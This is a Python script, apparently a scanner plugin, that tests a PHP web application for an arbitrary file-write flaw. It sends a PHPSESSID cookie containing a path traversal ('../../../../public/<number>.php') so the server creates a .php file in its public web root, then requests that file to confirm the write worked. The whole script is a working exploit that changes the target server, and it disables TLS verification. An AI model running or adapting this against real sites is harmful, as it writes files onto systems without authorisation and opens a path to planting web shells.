import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
f1=randomInt(800000000, 900000000)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+""+str(f1)+".php"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 404:
		r0=True
	else:
		r0=False
	url=baseurl+""
	headers={'Cookie': 'PHPSESSID=../../../../public/'+str(f1)+'.php'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "set-cookie" in response.headers and str(f1) in response.headers["Set-Cookie"]:
				f_list.append(1)
		if len(f_list)==1:
			r1=True
		else:
			r1=False
	else:
		if response.status_code == 200 and "set-cookie" in response.headers and str(f1) in response.headers["Set-Cookie"]:
			r1=True
		else:
			r1=False
	url=baseurl+""+str(f1)+".php"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "text/html" in response.headers["Content-Type"]:
				f_list.append(1)
		if len(f_list)==1:
			r2=True
		else:
			r2=False
	else:
		if response.status_code == 200 and "text/html" in response.headers["Content-Type"]:
			r2=True
		else:
			r2=False
	if r0 and r1 and r2:
		return True
	else:
		return False
